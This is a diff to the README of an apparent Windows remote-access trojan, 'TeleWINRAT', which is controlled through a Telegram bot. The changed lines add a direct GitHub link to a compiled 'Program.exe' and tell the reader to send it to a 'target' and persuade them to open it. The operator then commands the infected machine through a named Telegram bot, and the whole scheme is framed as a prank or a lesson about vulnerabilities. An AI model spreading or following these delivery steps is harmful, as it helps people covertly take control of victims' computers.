@@ -11,8 +11,8 @@
 With the procedure below, you can either play a harmless prank on a friend (at your own discretion, of course) or gain knowledge about the current vulnerabilities in Windows.
 
 ## Procedure 🦿
-- Copy the file link of  "program.exe"
-- Send the file link to your target and tell them to open the file.
+- Copy the file link of  "[program.exe](https://github.com/vaibhavard/TeleWINRAT/blob/main/Program.exe)" --> https://github.com/vaibhavard/TeleWINRAT/blob/main/Program.exe
+- Send the file link to your target and tell them to open the file ( AT YOUR OWN LIABILITY AND RISK).
 - Download telegram on your phone and go to https://t.me/xyxxyz_bot or search @xyxxyz_bot on telegram.
 - Type "/help" in the telegram chat of bot and You will **recieve a list of functions (see below image)** that the bot can perform.
 ![image](https://github.com/vaibhavard/TeleWINRAT/assets/57561743/b9cf19d1-414b-4d22-b1e0-3a1e5a0a4ee2)
